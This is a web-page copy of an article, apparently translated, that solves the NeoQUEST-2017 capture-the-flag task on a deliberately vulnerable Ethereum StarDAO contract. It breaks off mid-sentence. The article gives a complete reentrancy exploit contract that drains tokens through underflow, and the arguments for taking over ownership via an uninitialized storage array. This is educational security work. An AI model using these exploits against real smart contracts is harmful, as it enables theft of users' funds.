<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Cryptocurrency Ethereum: write an exploit under a vulnerable smart contract and get tokens</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="How many copies are already broken in talking about cryptocurrency? Banks and government agencies argue about its legal status, and private organizati...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Cryptocurrency Ethereum: write an exploit under a vulnerable smart contract and get tokens</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/2d1/aaf/8b2/2d1aaf8b2eab4aeeafc68fd489d4997a.jpg" align="left">  How many copies are already broken in talking about cryptocurrency?  Banks and government agencies argue about its legal status, and private organizations are coming up with different ways to use the <a href="https://ru.wikipedia.org/wiki/%25D0%25A6%25D0%25B5%25D0%25BF%25D0%25BE%25D1%2587%25D0%25BA%25D0%25B0_%25D0%25B1%25D0%25BB%25D0%25BE%25D0%25BA%25D0%25BE%25D0%25B2_%25D1%2582%25D1%2580%25D0%25B0%25D0%25BD%25D0%25B7%25D0%25B0%25D0%25BA%25D1%2586%25D0%25B8%25D0%25B9">blockchain</a> .  We thought about the safety of this technology and related products. <br><br>  Using the <a href="http://neoquest.ru/">NeoQUEST-2017</a> job as an example, we <a href="http://neoquest.ru/">deal</a> with smart contracts <a href="https://ru.wikipedia.org/wiki/Ethereum">Ethereum</a> - the second most popular cryptocurrency after Bitcoin.  Competitors had to write an exploit to a vulnerable contract.  How to make it - we read under a cat! <br><a name="habracut"></a><br><h2>  <b>What is Ethereum?</b> </h2><br>  Ethereum is a <a href="https://ru.wikipedia.org/wiki/%25D0%259A%25D1%2580%25D0%25B8%25D0%25BF%25D1%2582%25D0%25BE%25D0%25B2%25D0%25B0%25D0%25BB%25D1%258E%25D1%2582%25D0%25B0">cryptocurrency</a> , that is, a distributed database that stores information about how much money there is.  Users can interact with the database with the help of transactions - commands that are checked for correctness and are collected in blocks by special users - miners. <br><br>  When a transaction enters the block, it is considered confirmed, and its effect takes effect.  A chain of transaction blocks (blockchain) ensures data integrity and synchronization of database status between all users. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      A feature of Ethereum is the support of smart contracts.  <a href="http://old.computerra.ru/1998/266/194332/">A smart contract</a> is a code that is entered into the blockchain and manages a separate cryptocurrency account.  It can receive and send money, process information and store important data.  Account management is carried out without human intervention according to a predetermined, unchanged algorithm. <br><br>  The code of smart contracts can be written in different languages, but the most common is <a href="https://github.com/ethereum/wiki/wiki/%25D0%25A0%25D1%2583%25D0%25BA%25D0%25BE%25D0%25B2%25D0%25BE%25D0%25B4%25D1%2581%25D1%2582%25D0%25B2%25D0%25BE-%25D0%25BF%25D0%25BE-Solidity">Solidity</a> ( <a href="https://habrahabr.ru/post/312008/">here</a> you can read a curious habrastya about the implementation of a smart contract for Solidity).  This language is similar to JavaScript with the addition of special constructions for working with the blockchain.  An important difference from JS is that the code is compiled into byte code for the Ethereum virtual machine (EVM).  Publication of bytecode is carried out using a special transaction. <br><br>  After entering the blockchain, a smart contract receives an address that can be used to send and receive cryptocurrency.  Users can invoke various contract methods using transactions.  Such transactions are processed using a contract code. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/d8e/d1f/21f/d8ed1f21f7df42ed8fc506e95db3e05a.jpg"></div><br><br>  One application of smart contracts is the creation of <a href="https://libre.life/dao/ru">decentralized autonomous organizations</a> (DAO).  Such organizations usually sell tokens, exchanging cryptocurrency for them.  Owners of tokens can manage the organization, for example, make decisions about issuing new tokens or sponsoring an enterprise with the money accumulated in a smart contract.  In the DAO contract, a fairly large amount of cryptocurrency can be collected, which makes it a desirable target for hackers, because an error in the code of a smart contract may allow it to seize its wealth. <br><br><h2>  <b>Initial data to the task</b> </h2><br>  According to legend, the participants need to get the engine and fuel for the spacecraft, and they can do this through the StarDAO website.  Information on the site indicates that the company uses a smart contract based on the cryptocurrency Ethereum to trade in space equipment. <br><br><div class="spoiler">  <b class="spoiler_title">Smart contract code:</b> <div class="spoiler_text"><pre><code class="cpp hljs">contract StarDAO { address owner; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">StarDAO</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> payable </span></span>{ owner = msg.sender; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetOwner</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> owner; } modifier onlyOwner { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (msg.sender != owner) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span>; _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">TransferOwnership</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address newOwner)</span></span></span><span class="hljs-function"> onlyOwner </span></span>{ owner = newOwner; } mapping (address =&gt; uint) starTokens; uint starTokensTotalSupply = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BuyTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> payable </span></span>{ starTokensTotalSupply += msg.value; starTokens[msg.sender] += msg.value; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SellTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint amount)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (starTokens[msg.sender] &gt;= amount) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (msg.sender.call.value(amount)() == <span class="hljs-literal"><span class="hljs-literal">false</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span>; starTokensTotalSupply -= amount; starTokens[msg.sender] -= amount; } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetBalance</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> starTokens[addr]; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetTotalSupply</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> starTokensTotalSupply; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr, uint amount)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (starTokens[msg.sender] &gt;= amount) { starTokens[msg.sender] -= amount; starTokens[addr] += amount; } } mapping (uint =&gt; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span>) bonusCodes; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AddBonusCode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint code)</span></span></span><span class="hljs-function"> onlyOwner </span></span>{ bonusCodes[code] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HashReverse</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes s)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint8[</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">32</span></span></span></span><span class="hljs-function"><span class="hljs-params">])</span></span></span><span class="hljs-function"> </span></span>{ uint8[<span class="hljs-number"><span class="hljs-number">32</span></span>] res; bytes32 z = sha3(s); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (uint8 i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">32</span></span>; i++) res[<span class="hljs-number"><span class="hljs-number">31</span></span>-i] = uint8(z[i]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> res; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CalcCodeHash</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes code)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint)</span></span></span><span class="hljs-function"> </span></span>{ var tmp = HashReverse(code); uint codeHash = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (uint8 i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">32</span></span>; i++) codeHash = codeHash * <span class="hljs-number"><span class="hljs-number">256</span></span> + tmp[i]; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> codeHash; } mapping (address =&gt; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span>) fuelAccess; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BuyFuel</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint fuelPrice = <span class="hljs-number"><span class="hljs-number">1000000000000000000000000</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (starTokens[msg.sender] &gt;= fuelPrice) { starTokens[msg.sender] -= fuelPrice; starTokensTotalSupply -= fuelPrice; fuelAccess[msg.sender] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HasFuel</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> fuelAccess[addr]; } mapping (address =&gt; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span>) driveAccess; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetDrive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes code)</span></span></span><span class="hljs-function"> </span></span>{ uint codeHash = CalcCodeHash(code); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bonusCodes[codeHash]) { bonusCodes[codeHash] = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; driveAccess[msg.sender] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HasDrive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> driveAccess[addr]; } }</code> </pre> <br></div></div><br><br>  Registering on the site gives you access to your personal account, where you can carry out basic operations with cryptocurrency: make transactions, create smart contracts and interact with existing contracts.  In addition, a small amount of cryptocurrency is issued at registration: 1 ETH, or (which is the same) 10 <sup>18</sup> WEI, the smallest ETH particles. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/e5a/71c/9c8/e5a71c9c8fb14de28f95f102755ce715.png"></div><br><br>  There is also a tab "Get the goods", but when you try to find out the issuing code, an error occurs.  It looks like the web server checks the availability of the engine and fuel for the selected account using a smart contract (for good reason, it has <i><b>HasFuel ()</b></i> and <i><b>HasDrive ()</b></i> functions!).  An issuance code is provided only if the result of the check is successful. <br><br><h2>  <b>Part 1: we get fuel</b> </h2><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HasFuel</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> fuelAccess[addr]; }</code> </pre><br><br>  The <i><b>HasFuel ()</b></i> function checks the array fuelAccess and returns true only if the value true is entered into an array cell corresponding to the passed address.  Therefore, you need to achieve the condition fuelAccess [our_address] == true. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BuyFuel</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint fuelPrice = <span class="hljs-number"><span class="hljs-number">1000000000000000000000000</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (starTokens[msg.sender] &gt;= fuelPrice) { starTokens[msg.sender] -= fuelPrice; starTokensTotalSupply -= fuelPrice; fuelAccess[msg.sender] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; } }</code> </pre><br><br>  The <i><b>BuyFuel ()</b></i> function sets the fuel cost to 10 <sup>24</sup> WEI, that is, 1 million ETH.  Then there is a check that the user who called the function has a sufficient number of tokens.  If successful, the tokens are written off, and information on the purchase of fuel is entered into the fuelAccess array.  Therefore, all you need to get the key is to get enough funds to buy. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SellTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint amount)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (starTokens[msg.sender] &gt;= amount) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (msg.sender.call.value(amount)() == <span class="hljs-literal"><span class="hljs-literal">false</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span>; starTokensTotalSupply -= amount; starTokens[msg.sender] -= amount; } }</code> </pre><br><br>  The exchange of cryptocurrencies for tokens, the transfer of tokens from one account to another and the reverse exchange of tokens for cryptocurrency are performed by the functions <i><b>BuyTokens ()</b></i> , <i><b>SendTokens ()</b></i> and <i><b>SellTokens ()</b></i> .  The latter is of particular interest.  This function accepts as input the number of tokens that the user wants to exchange for a cryptocurrency, and checks if the user has enough tokens. <br><br>  If the test is successful, the function attempts to send the requested WEI number to the user.  If the user for some reason does not accept the money sent, the throw statement is called, which terminates the execution of the contract and rolls back all changes.  If the money comes, then the number of derived tokens is subtracted from the number of user tokens. <br><br>  At first glance, the algorithm of the function is correct.  This is true, but ... Not in one special case!  The thing is that this function can be called not by an ordinary user, but by another smart contract.  This contract can be implemented the so-called fallback function, which is called whenever the contract accepts money.  Therefore, an arbitrary code can be executed between checking the condition and writing off the tokens. <br><br>  Of course, the code will be executed in the context of the contract receiving the payment and will not be able to directly affect the StarDAO contract.  But nothing prevents you from calling out some function of the StarDAO contract and breaking the atomicity of <i><b>SellTokens ()</b></i> . <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> attack = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; function () payable { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (attack) { attack = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; dao.SellTokens(<span class="hljs-number"><span class="hljs-number">1</span></span>); } }</code> </pre><br><br>  How can this be used?  Suppose there is a contract that now has exactly 1 token in StarDAO.  Suppose there is a logical variable in the contract: attack = true and fallback, which checks the attack and, if successful, resets it to false and sells 1 token.  Let's see what happens if the contract tries to sell one of its tokens. <br><br>  And something interesting is happening!  The contract calls <i><b>SellTokens (1)</b></i> .  StarDAO checks that starTokens [our_address] ‚â• 1 - the condition is met, because the contract has just 1 token.  StarDAO sends the contract to 1 WEI, causing the fallback function to be called.  It clears the attack flag and calls <i><b>SellTokens (1)</b></i> again. <br><br>  StarDAO again checks that starTokens [our_address] ‚â• 1 - the condition is still met, because 1 token has not yet been written off.  Therefore, StarDAO once again sends 1 WEI to the contract (and the fallback function does nothing, since attack = false now).  After that, StarDAO subtracts a unit from each contract tokens for each WEI sent. <br><br>  After the first subtraction, the number of tokens becomes zero, and after the second, due to overflow of the integer variable, the contract becomes the happy owner of (2 <sup>256</sup> -1) tokens.  It is enough for fuel (and with it the first key)! <br><br>  The full contract code for the attack is shown below.  It shows the features of interaction with the contract StarDAO and contains all the steps of the attack. <br><br><div class="spoiler">  <b class="spoiler_title">Exploit code:</b> <div class="spoiler_text"><pre> <code class="cpp hljs">contract StarDAO { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">BuyTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> payable</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SellTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint amount)</span></span></span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetBalance</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint)</span></span></span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendTokens</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address addr, uint amount)</span></span></span></span>; } contract Bad { address owner; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> attack; StarDAO dao = StarDAO(<span class="hljs-number"><span class="hljs-number">0x91d6561b996fba322b1a5ecfdf462b4ee0b130d7</span></span>); <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Bad</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> payable </span></span>{ owner = msg.sender; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">launchAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ attack = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; dao.BuyTokens.value(<span class="hljs-number"><span class="hljs-number">1</span></span>)(); dao.SellTokens(<span class="hljs-number"><span class="hljs-number">1</span></span>); dao.SendTokens(owner, dao.GetBalance(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>)); } function () payable { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (attack) { attack = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; dao.SellTokens(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } }</code> </pre><br></div></div><br><br><h2>  <b>Part 2: get the engine</b> </h2><br><pre> <code class="cpp hljs"> <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetDrive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes code)</span></span></span><span class="hljs-function"> </span></span>{ uint codeHash = CalcCodeHash(code); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bonusCodes[codeHash]) { bonusCodes[codeHash] = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; driveAccess[msg.sender] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; } }</code> </pre><br><br>  The <i><b>GetDrive ()</b></i> function is responsible for getting the engine.  It takes some code as input, calculates its modified keccak-256 hash, and checks for the presence of this hash in the bonusCodes array.  If there is a hash, it is deleted, and the user gets the engine. <br><br><pre> <code class="cpp hljs">address owner; modifier onlyOwner { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (msg.sender != owner) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span>; _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AddBonusCode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint code)</span></span></span><span class="hljs-function"> onlyOwner </span></span>{ bonusCodes[code] = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; }</code> </pre><br><br>  You can add a hash to the bonusCodes array using the <i><b>AddBonusCode ()</b></i> function.  The catch is that the onlyOwner modifier only allows the owner of an account whose address is stored in the variable owner.  So, to add code and then use it, you need to become the owner of the contract. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">StarDAO</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> payable </span></span>{ owner = msg.sender; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">TransferOwnership</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address newOwner)</span></span></span><span class="hljs-function"> onlyOwner </span></span>{ owner = newOwner; }</code> </pre><br><br>  The variable owner is changed in the contract in just two places. <br><br>  First, it is set in the StarDAO contract constructor ().  The constructor is called only once - when creating a contract.  So, using it to change the owner will not work. <br><br>  Secondly, there is the <i><b>TransferOwnership ()</b></i> function, but it has the onlyOwner modifier.  It turns out that it is also not suitable for changing the owner. <br><br>  At this moment it seems that it is impossible to change the owner.  But it is not so!  Although Solidity is similar to JavaScript, it compiles, and the resulting bytecode does not work with variables, but with addresses in memory.  So you can try to determine where the owner value is stored, and rewrite it right there, at a low level. <br><br>  To do this, you need to figure out how memory works in the Ethereum virtual machine.  When executing a contract, two types of memory are used - memory and storage (in fact, there are code, stack and calldata, but these are nuances).  Memory is a temporary memory whose contents are not recorded on the blockchain and are not saved between contract calls.  Storage, on the contrary, is in the blockchain and stores the values ‚Äã‚Äãof the contract constant variables. <br><br>  Each time a variable is declared in Solidity without explicitly stating in which memory it is stored, the type of memory is automatically assigned to it.  For example, all global variables and all arrays are stored by default in storage.  Storage is an address space with an address length of <sup>2,256</sup> bits, divided into cells of 32 bytes.  All static variables (integers, arrays of constant size, etc.) are stored in storage sequentially, starting at address 0x0.  Variables that resize dynamically are stored in a more complex way, their address is calculated using the keccak-256 hash. <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HashReverse</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes s)</span></span></span><span class="hljs-function"> constant </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint8[</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">32</span></span></span></span><span class="hljs-function"><span class="hljs-params">])</span></span></span><span class="hljs-function"> </span></span>{ uint8[<span class="hljs-number"><span class="hljs-number">32</span></span>] res; bytes32 z = sha3(s); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (uint8 i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">32</span></span>; i++) res[<span class="hljs-number"><span class="hljs-number">31</span></span>-i] = uint8(z[i]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> res; }</code> </pre><br><br>  How does this help to change the contract owner?  Looking at the <i><b>HashReverse ()</b></i> function, you can see that it uses the res array.  When it is declared, the type of memory is not specified, which means that it is stored in storage.  In addition, this array is only declared, but not initialized. <br><br>  Since the Ethereum virtual machine by default initializes all data with zeros, the array will be assigned the address 0x0, and it will play the role of a peculiar NULL POINTER.  So, when writing to the array, the first 32 bytes of storage will be changed, in which the first declared variable in the contract is stored - owner. <br><br>  And since no version of Solidity supports the constant modifier (this word is reserved for the future to protect the function from making any changes to the blockchain), it becomes possible to overwrite the address of the owner of the contract. <br><br>  It is not possible to write your address to the owner variable, simply passing it as a parameter to the <i><b>HashReverse ()</b></i> function, since the argument is hashed beforehand.  Fortunately, the address of Ethereum is nothing but a hash of the public key of the account, which can be viewed in the user's personal account. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/2c0/d5c/49a/2c0d5c49a9844744a57779ee6733c1f1.png"></div><br><br>  In the above example, the public key - 0xe969598d9dcacebd89d0ca96f0a66c6908f9c3ff4f6652ac2d110fc49ae8f7d18313f2ecbbb612778d815c22cb858438a504e76c70de013c26c4c86e72dc07a4.  Hence, in order to become the owner of the contract, you should call (method transact) HashReverse () with the argument [0xe9, 0x69, 0x59, 0x8d, 0x9d, 0xca, 0xce, 0xbd, 0x89, 0xd0, 0xca, 0x96, 0xf0, 0xa6, 0x6c, 0x69 , 0x08, 0xf9, 0xc3, 0xff, 0x4f, 0x66, 0x52, 0xac, 0x2d, 0x11, 0x0f, 0xc4, 0x9a, 0xe8, 0xf7, 0xd1, 0x83, 0x13, 0xf2, 0xec, 0xbb, 0xb6, 0x12, 0x77, 0x8d , 0x81, 0x5c, 0x22, 0xcb, 0x85, 0x84, 0x38, 0xa5, 0x04, 0xe7, 0x6c, 0x70, 0xde, 0x01, 0x3c, 0x26, 0xc4, 0xc8, 0x6e, 0x72, 0xdc, 0x07, 0xa4].  <i><b>By</b></i> calling the <i><b>GetOwner ()</b></i> function after this, you can make sure that the address of the account and the owner 